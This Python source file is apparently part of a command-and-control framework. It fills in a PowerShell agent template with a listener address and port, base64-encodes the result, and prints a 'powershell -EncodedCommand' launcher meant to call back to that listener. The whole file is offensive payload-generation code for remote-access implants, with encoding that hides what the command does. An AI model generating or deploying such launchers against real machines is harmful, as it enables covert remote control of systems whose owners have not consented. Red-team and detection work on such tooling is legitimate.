import jinja2, re, base64, os

"""
Simple powershell HTTP agent
"""

def generate_payload():
    # read in powershell agent template
    templateLoader = jinja2.FileSystemLoader(searchpath="./lib/agents/windows_unstaged_powershell") # TODO os path join, read central abspath
    templateEnv = jinja2.Environment(loader=templateLoader)
    TEMPLATE_FILE = "agent.ps1"
    template = templateEnv.get_template(TEMPLATE_FILE)

    # render template with listeners ip and port
    agent_payload = template.render(
        LISTENER_IP="127.0.0.1", # TODO: read from options
        LISTENER_PORT=2001
    )

    payload = f"powershell -EncodedCommand {powershell_encode(agent_payload)}"

    return payload

def powershell_encode(data):
    powershell_command = ""

    n = re.compile(u'(\xef|\xbb|\xbf)')
    for char in (n.sub("", data)):
        powershell_command += char + "\x00"

    powershell_command = base64.b64encode(powershell_command.encode())
    return powershell_command.decode("utf-8")

if __name__ == "__main__":
    payload = generate_payload()
    print(payload)
